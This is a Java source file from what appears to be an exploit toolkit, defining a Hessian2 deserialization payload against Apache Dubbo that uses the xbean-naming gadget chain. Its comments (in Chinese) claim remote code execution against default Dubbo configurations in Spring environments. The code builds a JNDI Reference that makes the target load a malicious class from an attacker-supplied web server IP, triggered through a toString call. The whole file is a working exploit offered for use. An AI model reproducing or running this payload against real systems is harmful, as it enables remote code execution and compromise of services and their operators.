package com.threedr3am.exp.dubbo.payload.hessian;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Reflections;
import com.threedr3am.exp.dubbo.utils.ToStringUtil;
import javax.naming.Context;
import javax.naming.Reference;
import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
import org.apache.xbean.naming.context.WritableContext;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE
 *
 * Spring环境可打，暂时测试Spring-boot打不了
 *
 * <dependency>
 *   <groupId>org.apache.xbean</groupId>
 *   <artifactId>xbean-naming</artifactId>
 *   <version>4.15</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class XBeanPoc implements Payload {

  /**
   *
   * @param args
   *
   * arg[0]=恶意类所在web服务器ip
   * arg[1]=恶意类类名，此处需要恶意类无包名编译出来的
   *
   * @return
   */
  @Override
  public Object getPayload(String[] args) {
    Object s = null;
    try {
      Reference ref = new Reference("Calc", args[1],args[0]);
      Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
      ReadOnlyBinding binding = new ReadOnlyBinding("foo", ref, ctx);
      s = ToStringUtil.makeToStringTrigger(binding);
    } catch (Exception e) {
      e.printStackTrace();
    }
    return s;
  }
}
